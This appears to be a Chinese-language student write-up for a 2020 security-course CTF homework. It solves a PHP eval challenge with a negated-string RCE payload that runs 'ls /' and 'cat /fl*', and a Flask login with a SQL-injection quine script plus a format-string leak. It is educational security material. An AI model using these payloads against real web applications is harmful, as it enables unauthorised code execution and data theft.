---
tags: 2020 程式安全
---
# HW5
## (#°д°)
### 題目分析
* 題目直接給出source code
* 只要輸入(#°д°)的內容長度小於0x20然後通過regular expression的檢查就會送進去eval裡面執行
### 漏洞
* eval()可以執行系統的指令所以只要能夠構造出適當的payload就能夠做到RCE
### Exploit
* 如果要用php執行linux的系統指令就要用echo\`id\`或是system()然後把要執行的指令當作參數
* 因為php可以把變數拿來當作function執行所以只要讓某個變數\$a=system就可以用\$a(指令)來執行系統指令
* 再來因為有對輸入的內容做檢查輸入的內容不能是英文 數字或者重音符號才會把輸入的內容送到eval執行但是因為php可以對字串做運算所以就可以利用+ - ^等運算來構造出原本想要執行的內容並且能過通過regular expression的檢查
* 一開始先構造出`$_=system;$_(ls /);`這樣送到eval就能夠執行ls把/底下的檔案都列出來
* 然後把`system`和`ls /`用`~`取反這樣`system`會變成`%8C%86%8C%8B%9A%92`而`ls /`就會變成`%93%8C%DF%D0`之後再取反一次就能恢復成`system`和`ls /`
* system(ls /)
```=
https://php.splitline.tw/?(%23%C2%B0%D0%B4%C2%B0)=$_=~%8C%86%8C%8B%9A%92;$_(~%93%8C%DF%D0);
```
* 這樣就列出/底下的檔案了會發現有個flag_GV99N6HuFj1kpkV45Dp7A6Usk5s5nLUY的檔案
![](https://i.imgur.com/ehU5lYy.png)
* 再來用system(cat /fl\*)他就會把/底下fl開頭的檔案給讀出來就能拿到flag了
* system(cat /fl*)
```=
https://php.splitline.tw/?(%23%C2%B0%D0%B4%C2%B0)=$_=~%8C%86%8C%8B%9A%92;$_(~%9C%9E%8B%DF%D0%99%93%D5);
```
>FLAG{peeHpeeeeee(#°д°)!}
## VISUAL BASIC 2077
### 題目分析
* 題目給出了source code是使用flask框架的網頁
* 如果session的is_admin是true登入之後就能拿到flag
### 漏洞
* 題目存在SQL injection的漏洞
* 存在format string注入的漏洞
### Exploit
* 輸入帳號密碼的地方有SQL injection的漏洞但是會檢查從資料庫裡撈出來的帳號跟密碼和輸入的是不是相同的
* 如果使用union select fetchone()會撈到union select的那筆資料所以只要構造出輸入的內容跟經過sql語法處理後會還是相同結果就能夠通過帳號部分的檢查密碼因為是用union select自己構造的就可以任意輸入
* 這種輸入的內容會跟輸出的內容完全相同叫做quine
* 所以就可以寫個腳本來產生sql的quine
```python=
def quine(data, debug=True):
    data = data.replace('$$',"REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)")
    blob = data.replace('$$','"$"').replace("'",'"')
    data = data.replace('$$',"'"+blob+"'")
    return data

input = '\' UNION SELECT $$ AS id,"abcd" AS pw--'
print(quine(input))
```
* 要成功登入鎖鑰產生的語法是`' UNION SELECT $$ AS id,"abcd" AS pw--`只要隨便用union select出一筆資料並且把密碼註解掉就能成功登入了
* 產生出來quine的語法是
```sql=
' UNION SELECT REPLACE(REPLACE('" UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS id,"abcd" AS pw-- ',CHAR(34),CHAR(39)),CHAR(36),'" UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS id,"abcd" AS pw-- ') AS id,'abcd' AS pw-- 
```
* 這樣產生出來的SQL語法就會是quine的樣子出來的東西會跟餵進資料庫的相同就會變成我們用sql injection產生的username然後密碼是union select設定的abcd所以這樣就能通過帳號跟密碼的檢查成功登入了
* 成功登入之後因為在歡迎的地方return是直接把username插進去所以就可以直接注入format string格式他就會被解析出來
```python=
return ("<h1>Hello, " + username + " ｡:.ﾟヽ(*´∀`)ﾉﾟ.:｡ </h1> Here is your flag: {flag} ").format(flag=flag)
```
* 所以就在裡面插入{flag.flag}這樣flag就會被解析出來
* 所以sql語法變成`' UNION SELECT $$ AS id,"abcd" AS pw-- {flag.flag}`
* 然後再用quine的腳本產生一次quine的sql語法最後就能成功拿到flag
```sql=
' UNION SELECT REPLACE(REPLACE('" UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS id,"abcd" AS pw-- {flag.flag}',CHAR(34),CHAR(39)),CHAR(36),'" UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS id,"abcd" AS pw-- {flag.flag}') AS id,'abcd' AS pw-- {flag.flag}
```
>FLAG{qu1n3_sq1_1nj3ct10nnn.\_\_init\_\_}